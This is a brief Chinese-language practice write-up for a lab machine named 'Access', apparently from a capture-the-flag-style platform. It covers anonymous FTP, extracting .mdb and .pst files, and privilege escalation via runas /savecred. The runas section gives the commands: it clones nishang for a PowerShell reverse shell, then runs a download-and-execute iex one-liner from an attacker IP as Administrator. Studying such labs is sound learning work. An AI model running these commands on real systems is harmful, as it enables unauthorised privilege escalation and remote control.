# Access

- 練習日期:   2026/04/17
- 考點:       FTP 匿名登入、.mdb 及 .pst 舊版資料庫與郵件檔分析、runas /savecred 濫用、DPAPI 憑證解密。

## FTP 匿名登入

沒什麼好說的。

## .mdb 及 .pst 舊版資料庫與郵件檔分析
### MDB (Microsoft Access Database)

- 使用 Linux 工具 mdbtools 進行離線分析。
    - mdb-tables backup.mdb (列出資料表)
    - mdb-export backup.mdb auth_user (匯出 auth_user 資料表內容)
    - `mdb-tables backup.mdb | tr ' ' '\n' | grep . | while read table; do lines=$(mdb-export backup.mdb $table | wc -l); if [ $lines -gt 1 ]; then echo "$table: $lines"; fi; done` 快速過濾空資料表。
- 使用 pst-utils 工具包將 .pst 檔案轉換為可讀格式。
    - `readpst Access Control.pst` 轉換 .pst 檔案為 mbox 格式，接著直接 cat 就可以了。

## runas /savecred 濫用

runas /savecred 是 Windows 提供的一個功能，允許使用者在第一次使用 runas 命令時輸入密碼，並將該密碼保存起來，以便下次使用時不需要再次輸入。
做法是搭配 nishang 來建立 reverse shell。

```
git clone https://github.com/samratashok/nishang.git
vim nishang/Shells/Invoke-PowerShellTcp.ps1             ## 修改 IP 和 Port
C:\Users\security\AppData\Local\Temp>runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.11/shell.ps1')"
```

詳細可以看 PrivilegeEscalation.md 中的 runas 部分。

## DPAPI 憑證解密

詳閱 PrivilegeEscalation.md 中的 DPAPI 部分。